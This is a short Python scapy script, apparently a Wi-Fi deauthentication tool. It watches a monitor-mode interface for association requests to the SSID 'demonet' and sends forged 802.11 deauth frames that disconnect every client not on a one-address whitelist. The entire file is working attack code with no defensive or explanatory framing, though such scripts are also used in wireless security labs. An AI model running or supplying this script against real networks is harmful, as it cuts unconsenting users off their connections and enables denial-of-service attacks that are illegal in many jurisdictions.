#!/usr/bin/env python3
from scapy.all import *
import time

SSID = 'demonet'
IFACE = 'mon0'
whitelist = ['ab:cd:ef:ab:cd:ef']

def check_deauth(pkt):
    elt = pkt[Dot11Elt]
    while elt and elt.ID != 0:
        elt = elt.payload[Dot11Elt]
    if elt.info == SSID:
        deauth(pkt[Dot11].addr1, pkt[Dot11].addr2)


def deauth(bssid, client):
    if client in whitelist:
        return

    print("Sending a deauth to: {}, bssid: {}".format(
        client, bssid))
    packet = RadioTap() / \
             Dot11(type=0,
                   subtype=12,
                   addr1=client,
                   addr2=bssid,
                   addr3=bssid) / \
             Dot11Deauth(reason=7)
    sendp(packet, iface=IFACE)


sniff(iface=IFACE,
      prn=check_deauth,
      filter='type mgt subtype assoc-req')

